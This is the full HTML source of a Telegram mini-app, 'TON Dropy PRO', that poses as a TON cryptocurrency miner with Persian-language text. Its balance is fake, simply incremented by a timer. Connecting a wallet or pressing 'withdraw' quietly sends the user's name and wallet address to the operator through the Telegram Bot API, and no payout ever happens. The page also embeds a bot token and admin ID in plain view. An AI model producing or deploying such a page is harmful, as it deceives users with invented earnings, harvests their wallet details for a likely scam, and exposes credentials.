<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TON Dropy PRO</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;800&display=swap');
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { margin: 0; font-family: 'Vazirmatn', sans-serif; background: #0f172a; color: #fff; padding: 20px; text-align: center; }
        .card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); padding: 20px; border-radius: 20px; margin-bottom: 15px; }
        #balance { font-size: 34px; font-weight: 800; color: #00c6ff; display: block; margin: 10px 0; }
        .btn-withdraw { width: 100%; padding: 15px; border: none; border-radius: 15px; font-size: 16px; font-weight: 700; color: #fff; background: linear-gradient(90deg, #ff512f, #dd2476); cursor: pointer; }
    </style>
</head>
<body>

    <h2>TON Dropy PRO ⛏</h2>

    <div class="card">
        <p>موجودی زنده</p>
        <span id="balance">0.000000</span>
        <div style="font-size:12px; color:#aaa;">⚡ 0.000012 TON/s</div>
    </div>

    <div class="card">
        <div id="ton-connect-button"></div>
    </div>

    <div class="card">
        <button class="btn-withdraw" onclick="withdraw()">درخواست برداشت 💸</button>
    </div>

<script>
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
    const ADMIN_ID = "5972276401";

    // موجودی
    let balance = parseFloat(localStorage.getItem('mining_bal')) || 0.0;
    setInterval(() => {
        balance += 0.000012;
        document.getElementById("balance").innerText = balance.toFixed(6);
        localStorage.setItem('mining_bal', balance.toString());
    }, 1000);

    // تنظیمات اتصال
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        // آدرس زیر را با یوزرنیم گیت‌هاب و نام ریپوزیتوری خودت کامل کن
        manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-mining/tonconnect-manifest.json',
        buttonRootId: 'ton-connect-button'
    });

    tonConnectUI.uiOptions = { twaReturnUrl: 'https://t.me/TonDropyBot' };

    tonConnectUI.onStatusChange(async (wallet) => {
        if (wallet) {
            const user = tg.initDataUnsafe?.user;
            const msg = `✅ <b>اتصال جدید!</b>\n👤 کاربر: ${user?.first_name}\n👛 آدرس: <code>${wallet.account.address}</code>`;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'HTML' })
            });
        }
    });

    async function withdraw() {
        if (!tonConnectUI.connected) { tg.showAlert("اول کیف پول رو وصل کن!"); return; }
        const user = tg.initDataUnsafe?.user;
        const msg = `💰 <b>درخواست برداشت!</b>\n👤 کاربر: ${user?.first_name}\n💵 مقدار: ${balance.toFixed(6)} TON\n👛 آدرس: <code>${tonConnectUI.account.address}</code>`;
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'HTML' })
        });
        tg.showAlert("درخواست ارسال شد!");
    }
</script>
</body>
</html>
